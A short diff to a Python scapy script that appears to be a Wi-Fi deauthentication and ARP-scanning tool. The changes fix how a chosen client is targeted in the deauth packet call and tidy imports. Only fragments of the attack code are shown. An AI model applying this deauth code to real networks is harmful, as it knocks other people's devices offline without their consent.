@@ -1,7 +1,6 @@
 from scapy.all import *
 import socket
 
-import sys
 import threading
 
 threads = []
@@ -11,7 +10,7 @@ clients = []
 gateway = []
 
 typeAttack = 0
-clientNum = 0
+clientNum = None
 deauthMac = '12:34:56:78:9A:BC'
 # Colors
 white = '\033[0;0;0m'
@@ -54,7 +53,7 @@ def deauth(type, clientNum = 0):
 					sendDeauthPacket(gateway[0], deauthMac, client[0], client[1])
 	except KeyboardInterrupt:
 		if type == 1:
-			sendDeauthPacket(gateway[0], gateway[1], client[0], client[1])
+			sendDeauthPacket(gateway[0], gateway[1], clients[clientNum][0], clients[clientNum][1])
 		else:
 			for client in clients:
 				sendDeauthPacket(gateway[0], gateway[1], client[0], client[1])
@@ -73,7 +72,6 @@ def ARP_Scanner(start):	#Arp - Send&Recive
 				end=' [ {0} ]\n'.format(paintString('GATEWAY', yellow))
 			print('[ {0} ] {1}\t{2}'.format(paintString(str(len(clients)), red), clients[len(clients) - 1][0], clients[len(clients) - 1][1]), end=end)
 			
-
 
 def ARP_Start():
 	lan_ip = getLanIp()
